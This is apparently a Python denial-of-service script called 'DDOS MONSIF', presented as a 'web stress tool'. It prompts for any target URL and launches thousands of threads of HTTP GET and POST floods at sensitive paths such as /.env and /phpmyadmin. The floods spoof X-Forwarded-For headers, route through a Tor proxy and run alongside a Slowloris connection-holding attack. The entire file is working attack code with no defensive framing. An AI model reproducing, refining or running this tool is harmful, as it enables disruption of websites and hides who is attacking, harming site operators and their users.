# -*- coding: utf-8 -*-
# DDOS MONSIF - Custom Layer7 Tool by Mr Monsif

import time
import random
import threading
import requests
import socket
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# --- Display banner ---
print("""
 █████╗ ██████╗  ██████╗ ███████╗    ███╗   ███╗ ██████╗ ███╗   ██╗███████╗███████╗
██╔══██╗██╔══██╗██╔════╝ ██╔════╝    ████╗ ████║██╔═══██╗████╗  ██║██╔════╝██╔════╝
███████║██████╔╝██║  ███╗█████╗      ██╔████╔██║██║   ██║██╔██╗ ██║█████╗  ███████╗
██╔══██║██╔═══╝ ██║   ██║██╔══╝      ██║╚██╔╝██║██║   ██║██║╚██╗██║██╔══╝  ╚════██║
██║  ██║██║     ╚██████╔╝███████╗    ██║ ╚═╝ ██║╚██████╔╝██║ ╚████║███████╗███████║
╚═╝  ╚═╝╚═╝      ╚═════╝ ╚══════╝    ╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚══════╝

               ▓▓ Mr Monsif | Custom Web Stress Tool ▓▓
""")

# --- Ask for target URL ---
TARGET_URL = input("Enter the target URL (e.g. https://example.com): ").strip()

# --- Configurations ---
THREADS = 6000
DURATION = 696969
EVIL_PATHS = [
    "/wp-json/wp/v2/users",
    "/phpmyadmin/index.php",
    "/.env",
    "/graphql",
    "/api/v1/search?query=AAAAAAAAAAAAAAAAAAAAA..."
]
ROTATING_PROXIES = [
    None,
    "socks5://127.0.0.1:9050"
]

# --- Web Hammer Class ---
class WebHammer:
    def __init__(self):
        self.user_agents = open("user-agents.txt").read().splitlines()
        self.referers = [
            "https://www.google.com/search?q=" + TARGET_URL,
            "http://www.bing.com/search?q=" + TARGET_URL.split("//")[1]
        ]

    def nuclear_request(self):
        while True:
            try:
                session = requests.Session()
                proxy = random.choice(ROTATING_PROXIES)
                path = random.choice(EVIL_PATHS)
                headers = {
                    "User-Agent": random.choice(self.user_agents),
                    "Referer": random.choice(self.referers),
                    "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Connection": "keep-alive"
                }
                if random.randint(0, 10) > 7:
                    session.post(
                        f"{TARGET_URL}{path}",
                        headers=headers,
                        data={"malware": "A" * 10240},
                        verify=False,
                        proxies={"http": proxy, "https": proxy},
                        timeout=30
                    )
                else:
                    session.get(
                        f"{TARGET_URL}{path}?cache_buster={random.randint(1, 1000000)}",
                        headers=headers,
                        verify=False,
                        proxies={"http": proxy, "https": proxy},
                        timeout=30
                    )
            except:
                pass

# --- Slowloris Attack ---
def slowloris_ambush():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((TARGET_URL.split("//")[1].split("/")[0], 80))
            s.send(f"GET / HTTP/1.1\r\nHost: {TARGET_URL}\r\n".encode())
            while True:
                s.send(f"X-a: {random.randint(1,5000)}\r\n".encode())
                time.sleep(100)
        except:
            pass

# --- Launch the threads ---
if __name__ == "__main__":
    for _ in range(THREADS):
        threading.Thread(target=WebHammer().nuclear_request, daemon=True).start()
        threading.Thread(target=slowloris_ambush, daemon=True).start()

    time.sleep(DURATION)
